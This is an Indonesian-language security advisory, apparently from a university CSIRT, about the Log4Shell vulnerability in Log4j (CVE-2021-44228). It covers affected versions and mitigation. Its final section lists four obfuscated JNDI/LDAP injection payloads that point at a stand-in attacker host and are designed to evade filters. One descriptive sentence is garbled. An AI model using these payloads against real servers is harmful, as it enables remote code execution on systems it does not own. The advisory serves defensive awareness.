![thumbBanner](https://github.com/CSIRT-UMM/cysec-article/blob/main/28012022%20-%20Log4J/log4jThumb.png)
# Kerentanan <i>Zero-Day</i> Apache Java Logging Library LOG4J (CVE-2021-44228)

Log4J, mengalami kerentanan Log4Shell yang sedang memengaruhi banyak komputer. Perangkat lunak ini dibuat untuk merekam segala macam kegiatan yang berlangsung di berbagai sistem komputer, dengan memanfaatkan Java.
Log4Shell bekerja dengan cara menyalahgunakan fitur di Log4j yang memungkinkan pengguna untuk memasukkan kode khusus untuk memformat pesan log. Fitur ini memungkinkan Log4j untuk data-data server.
<br>Versi dari Log4j yang terdampak oleh kerentanan ini adalah komputer yang menjalankan Log4j versi >=2.0 dan <=2.14.1.

---
## Cara Memitigasi Kerentanan
Ganti kelas `org.apache.logging.log4j.core.lookup.JndiLookup` ke versi yang telah diperbaiki, sehingga classloader dapat menggunakan kelas pengganti ketimbang versi kelas yang rentan, atau dengan mengunduh patch JndiLookup dan menambalnya melalui java agent.

---

## Berikut adalah contoh-contoh exploit yang biasa digunakan untuk melakukan serangan
`${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}`<br>
`${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}`<br>
`${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}`<br>
`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}`<br>
dsb.

---
Sources:<br>
https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words/blob/main/README.md<br>
https://www.lunasec.io/docs/blog/log4j-zero-day/<br>
https://github.com/Glavo/log4j-patch<br>
